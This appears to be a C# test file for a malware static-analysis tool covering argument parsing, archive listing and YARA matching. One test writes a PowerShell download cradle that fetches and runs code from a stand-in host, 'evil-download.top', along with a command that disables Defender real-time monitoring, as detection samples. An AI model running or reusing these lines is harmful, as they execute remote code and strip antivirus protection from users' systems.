using System.IO.Compression;
using Blazma.Analysis.Static;
using Blazma.Analysis.Yara;
using Blazma.Core.Samples;

namespace Blazma.Analysis.Tests;

public class StaticWorkerTests
{
    [Fact]
    public void Arguments_round_trip()
    {
        var options = new StaticWorkerOptions(DetectCapabilities: false, YaraFolder: "C:/rules", ArchivePassword: "infected");
        var parsed = StaticWorker.ParseArguments(StaticWorker.BuildArguments("C:/s.exe", options));
        Assert.NotNull(parsed);
        Assert.Equal("C:/s.exe", parsed.Value.Path);
        Assert.Equal(options, parsed.Value.Options);
    }

    [Theory]
    [InlineData("--static-worker")]
    [InlineData("--static-worker", "a", "--unknown")]
    [InlineData("--static-worker", "a", "--yara")]
    [InlineData("--other", "a")]
    public void Rejects_malformed_arguments(params string[] args) => Assert.Null(StaticWorker.ParseArguments(args));

    [Fact]
    public void Recognizes_both_helper_modes()
    {
        Assert.True(StaticWorker.IsWorkerInvocation(["--static-worker", "a"]));
        Assert.True(StaticWorker.IsWorkerInvocation(["--extract-worker", "a.zip", "x.exe", "out"]));
        Assert.False(StaticWorker.IsWorkerInvocation(["--extract-worker", "a.zip"]));
        Assert.False(StaticWorker.IsWorkerInvocation(["file.exe"]));
    }
}

public sealed class StaticAnalyzerExtrasTests : IDisposable
{
    private readonly string _dir = Path.Combine(Path.GetTempPath(), "blazma-static-" + Guid.NewGuid().ToString("N"));

    public StaticAnalyzerExtrasTests() => Directory.CreateDirectory(_dir);

    public void Dispose()
    {
        try { Directory.Delete(_dir, recursive: true); } catch (IOException) { }
    }

    [Fact]
    public async Task A_script_gets_capabilities_artifacts_and_yara_matches()
    {
        var path = Path.Combine(_dir, "cradle.ps1");
        File.WriteAllText(path, "IEX (New-Object Net.WebClient).DownloadString('http://evil-download.top/p.ps1')\nSet-MpPreference -DisableRealtimeMonitoring $true");
        var yara = YaraRuleSet.FromSources([("rule cradle { strings: $a = \"DownloadString\" condition: $a }", "test.yar")]);

        var report = await new StaticAnalyzer(yara, detectCapabilities: true).AnalyzeAsync(path, CancellationToken.None);

        Assert.Equal(FileKind.PowerShell, report.Sample.Kind);
        Assert.Contains(report.YaraMatches, m => m.Rule == "cradle");
        Assert.Contains(report.Artifacts, a => a.Value.Contains("evil-download.top", StringComparison.Ordinal));
        Assert.NotEmpty(report.Capabilities);
        Assert.Null(report.ImpHash);
    }

    [Fact]
    public async Task Capabilities_can_be_turned_off()
    {
        var path = Path.Combine(_dir, "a.ps1");
        File.WriteAllText(path, "Set-MpPreference -DisableRealtimeMonitoring $true");
        var report = await new StaticAnalyzer(null, detectCapabilities: false).AnalyzeAsync(path, CancellationToken.None);
        Assert.Empty(report.Capabilities);
    }

    [Fact]
    public async Task An_archive_is_listed_not_extracted()
    {
        var path = Path.Combine(_dir, "bundle.zip");
        using (var zip = ZipFile.Open(path, ZipArchiveMode.Create))
        using (var w = new StreamWriter(zip.CreateEntry("inner/run.bat").Open()))
            w.Write("@echo off");

        var report = await new StaticAnalyzer().AnalyzeAsync(path, CancellationToken.None);

        Assert.Equal(FileKind.Archive, report.Sample.Kind);
        var entry = Assert.Single(report.Archive!.Entries);
        Assert.Equal("inner/run.bat", entry.Path);
        Assert.Equal(FileKind.Batch, entry.Kind);
        Assert.Single(Directory.GetFiles(_dir));
    }
}

public class FailureLocationTests
{
    [Fact]
    public async Task Names_the_first_blazma_method_of_an_async_stack()
    {
        var caught = await Assert.ThrowsAsync<IOException>(ThrowInUse);
        Assert.Equal(" · FailureLocationTests.ThrowInUse", Blazma.Analysis.Pipeline.AnalysisRunner.Where(caught));
    }

    [Fact]
    public void Says_nothing_without_a_stack() =>
        Assert.Equal(string.Empty, Blazma.Analysis.Pipeline.AnalysisRunner.Where(new IOException("x")));

    private static async Task ThrowInUse()
    {
        await Task.Yield();
        throw new IOException("in use");
    }
}
